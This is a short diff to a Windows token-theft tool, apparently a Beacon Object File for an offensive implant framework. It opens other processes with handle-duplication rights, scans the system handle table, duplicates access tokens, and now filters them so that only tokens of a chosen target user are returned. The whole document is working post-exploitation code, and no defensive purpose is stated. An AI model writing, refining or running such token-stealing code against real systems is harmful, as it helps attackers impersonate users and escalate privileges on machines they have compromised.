@@ -165,7 +165,8 @@ static HANDLE try_direct(DWORD pid) {
 }
 
 /* Strategy 2: handle table scan */
-static HANDLE try_handle_scan(DWORD pid, SYSTEM_HANDLE_INFORMATION *shi) {
+static HANDLE try_handle_scan(DWORD pid, SYSTEM_HANDLE_INFORMATION *shi,
+                              const char *filter) {
     if (!shi) return NULL;
     HANDLE proc = KERNEL32$OpenProcess(PROCESS_DUP_HANDLE, FALSE, pid);
     if (!proc) return NULL;
@@ -183,6 +184,12 @@ static HANDLE try_handle_scan(DWORD pid, SYSTEM_HANDLE_INFORMATION *shi) {
         TOKEN_TYPE tt;
         DWORD len;
         if (!ADVAPI32$GetTokenInformation(dup, TokenType, &tt, sizeof(tt), &len)) {
+            KERNEL32$CloseHandle(dup);
+            continue;
+        }
+
+        /* Verify this token actually belongs to the target user */
+        if (!token_matches_filter(dup, filter)) {
             KERNEL32$CloseHandle(dup);
             continue;
         }
@@ -292,7 +299,7 @@ void go(char *args, int len) {
         HANDLE primary = try_direct(pe.th32ProcessID);
         const char *method = "direct";
         if (!primary) {
-            primary = try_handle_scan(pe.th32ProcessID, shi);
+            primary = try_handle_scan(pe.th32ProcessID, shi, filter);
             method = "handle scan";
         }
         if (!primary) {
